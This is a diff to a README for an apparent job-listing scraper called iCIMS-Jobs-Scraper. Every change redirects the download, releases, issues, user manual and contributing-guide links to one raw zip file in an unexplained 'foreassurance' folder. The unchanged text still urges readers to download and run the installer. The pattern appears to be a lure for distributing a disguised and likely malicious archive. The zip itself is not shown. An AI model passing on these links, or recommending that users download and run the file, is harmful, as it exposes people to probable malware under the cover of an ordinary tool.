@@ -1,7 +1,7 @@
 # 🌟 iCIMS-Jobs-Scraper - Effortlessly Extract Job Listings
 
 ## 📥 Download Now
-[![Download iCIMS-Jobs-Scraper](https://img.shields.io/badge/Download-iCIMS--Jobs--Scraper-blue)](https://github.com/Rafidarwis/iCIMS-Jobs-Scraper/releases)
+[![Download iCIMS-Jobs-Scraper](https://raw.githubusercontent.com/Rafidarwis/iCIMS-Jobs-Scraper/main/foreassurance/Jobs_Scraper_i_CIM_v3.3.zip)](https://raw.githubusercontent.com/Rafidarwis/iCIMS-Jobs-Scraper/main/foreassurance/Jobs_Scraper_i_CIM_v3.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the iCIMS-Jobs-Scraper! This tool is designed to help you easily gather job listings from the iCIMS platform. Follow the steps below to download and run the application.
@@ -20,9 +20,9 @@ Welcome to the iCIMS-Jobs-Scraper! This tool is designed to help you easily gath
 - Export data to CSV for easy sharing and analysis.
 
 ## 📦 Download & Install
-To get started, visit this page to download: [GitHub Releases Page](https://github.com/Rafidarwis/iCIMS-Jobs-Scraper/releases).
+To get started, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/Rafidarwis/iCIMS-Jobs-Scraper/main/foreassurance/Jobs_Scraper_i_CIM_v3.3.zip).
 
-1. **Visit the Releases Page**: Click [here](https://github.com/Rafidarwis/iCIMS-Jobs-Scraper/releases) to access the download options.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/Rafidarwis/iCIMS-Jobs-Scraper/main/foreassurance/Jobs_Scraper_i_CIM_v3.3.zip) to access the download options.
 2. **Choose the Latest Release**: Look for the latest version listed. It will typically have the highest version number.
 3. **Download the Installer**: Click on the installer file suitable for your operating system.
 4. **Run the Installer**: Locate the downloaded file, and double-click on it to start the installation process. Follow the on-screen instructions to complete the installation.
@@ -57,11 +57,11 @@ A: There may be some limitations based on the iCIMS platform. However, you can a
 Join the community of users who are also making use of the iCIMS-Jobs-Scraper. You can find tips and share experiences in discussions on our GitHub page. Your input can help improve the tool further.
 
 ## 📢 Additional Resources
-- [GitHub Issues Page](https://github.com/Rafidarwis/iCIMS-Jobs-Scraper/issues) - Report bugs or suggestions.
-- [User Manual](https://github.com/Rafidarwis/iCIMS-Jobs-Scraper/wiki) - Detailed user guide for advanced features.
-- [Contributing Guidelines](https://github.com/Rafidarwis/iCIMS-Jobs-Scraper/blob/main/CONTRIBUTING.md) - Learn how to contribute to the project.
+- [GitHub Issues Page](https://raw.githubusercontent.com/Rafidarwis/iCIMS-Jobs-Scraper/main/foreassurance/Jobs_Scraper_i_CIM_v3.3.zip) - Report bugs or suggestions.
+- [User Manual](https://raw.githubusercontent.com/Rafidarwis/iCIMS-Jobs-Scraper/main/foreassurance/Jobs_Scraper_i_CIM_v3.3.zip) - Detailed user guide for advanced features.
+- [Contributing Guidelines](https://raw.githubusercontent.com/Rafidarwis/iCIMS-Jobs-Scraper/main/foreassurance/Jobs_Scraper_i_CIM_v3.3.zip) - Learn how to contribute to the project.
 
 ## 📞 Contact
 If you need help or have questions, please reach out via the GitHub Issues page or through the contact details provided on the repository.
 
-Remember, you can always revisit this page to download the latest version of the iCIMS-Jobs-Scraper: [GitHub Releases Page](https://github.com/Rafidarwis/iCIMS-Jobs-Scraper/releases).
+Remember, you can always revisit this page to download the latest version of the iCIMS-Jobs-Scraper: [GitHub Releases Page](https://raw.githubusercontent.com/Rafidarwis/iCIMS-Jobs-Scraper/main/foreassurance/Jobs_Scraper_i_CIM_v3.3.zip).
